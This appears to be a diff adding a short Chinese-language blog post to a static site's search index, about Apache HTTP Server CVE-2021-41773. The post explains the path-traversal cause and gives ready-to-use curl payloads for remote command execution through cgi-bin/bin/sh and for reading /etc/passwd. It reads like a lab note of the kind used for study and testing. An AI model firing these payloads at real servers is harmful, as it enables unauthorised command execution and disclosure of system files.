@@ -4,6 +4,19 @@
   
     
     <entry>
+      <title>Apache CVE-2021-41773</title>
+      <link href="posts/59b5dccf.html"/>
+      <url>posts/59b5dccf.html</url>
+      
+        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>漏洞原因：</p><p>此漏洞由不安全的配置触发</p><p>如果网站配置中，将 根目录 / 配置为</p><pre class="line-numbers language-none"><code class="language-none">Require all granted<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>则可以通过cgi-bin/目录，配合 ../</p><p>只存在于apache2.4.49，在其他版本不存在</p><p>RCE</p><pre class="line-numbers language-none"><code class="language-none">curl --data "echo;id" 'http://your-ip:8080/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh'<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>任意文件读取</p><pre class="line-numbers language-none"><code class="language-none">curl -v --path-as-is http://your-ip:8080/icons/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://z3.ax1x.com/2021/10/09/5iU6ud.png"></p>]]></content>
+      
+      
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>linux命令</title>
       <link href="posts/8ebbbb0f.html"/>
       <url>posts/8ebbbb0f.html</url>
